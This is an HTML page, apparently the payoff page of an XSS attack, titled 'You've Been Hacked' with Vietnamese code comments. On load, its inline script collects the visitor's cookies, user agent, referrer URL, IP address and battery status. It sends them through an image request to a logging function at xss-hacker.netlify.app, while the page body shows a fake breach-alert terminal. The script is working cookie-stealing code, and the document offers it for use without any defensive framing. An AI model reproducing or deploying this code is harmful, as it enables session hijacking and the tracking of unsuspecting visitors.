<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Alert: You've Been Hacked bởi 4 chị em!</title>
    <link rel="stylesheet" href="style.css" />
    <script>
      // Hàm gửi thông tin về User-Agent, IP, URL gốc, và thông tin pin tới Netlify Function
      function sendDataToNetlify() {
        var cookies = document.cookie; // Lấy cookies của người dùng
        var currentUrl = window.location.href; // Lấy URL hiện tại (URL của trang XSS Hacker)
        var userAgent = navigator.userAgent; // Lấy User-Agent của trình duyệt

        // Lưu URL gốc vào sessionStorage (URL người dùng đã truy cập trước khi bị chuyển hướng)
        var originalUrl = document.referrer; // Lấy URL gốc của trang người dùng vừa truy cập
        sessionStorage.setItem("originalUrl", originalUrl);

        // Lấy địa chỉ IP của người dùng từ ipify API
        fetch("https://api.ipify.org?format=json")
          .then((response) => response.json()) // Chuyển đổi dữ liệu trả về thành JSON
          .then((data) => {
            var userIP = data.ip; // Lấy địa chỉ IP từ dữ liệu trả về

            // Lấy URL gốc từ sessionStorage
            var referrerUrl = sessionStorage.getItem("originalUrl");

            // Lấy thông tin pin của thiết bị người dùng
            navigator.getBattery().then(function (battery) {
              var batteryLevel = battery.level * 100; // Mức pin (phần trăm)
              var charging = battery.charging; // Trạng thái sạc (true/false)

              // Gửi thông tin (cookies, userAgent, IP, URL gốc, battery level, charging status) tới Netlify Function
              var img = new Image();
              img.src =
                "https://xss-hacker.netlify.app/.netlify/functions/logRequest?cookies=" +
                encodeURIComponent(cookies) +
                "&userAgent=" +
                encodeURIComponent(userAgent) +
                "&userIP=" +
                encodeURIComponent(userIP) +
                "&url=" +
                encodeURIComponent(referrerUrl) + // Gửi URL gốc
                "&batteryLevel=" +
                encodeURIComponent(batteryLevel) + // Gửi mức pin
                "&charging=" +
                encodeURIComponent(charging); // Gửi trạng thái sạc
            });
          })
          .catch((error) => {
            console.error("Error fetching IP:", error);
          });
      }

      // Gọi hàm khi trang tải
      window.onload = sendDataToNetlify;
    </script>
  </head>
  <body>
    <h1>ALERT!</h1>
    <p class="error">You have been hacked!</p>
    <div class="terminal">
      <p class="warning">System breach detected!</p>
      <p>Warning: Unauthorized access attempt detected on your account.</p>
      <p>Executing scripts...</p>
      <p>Injecting payload...</p>
      <p>Redirecting to malicious site...</p>
    </div>
  </body>
</html>
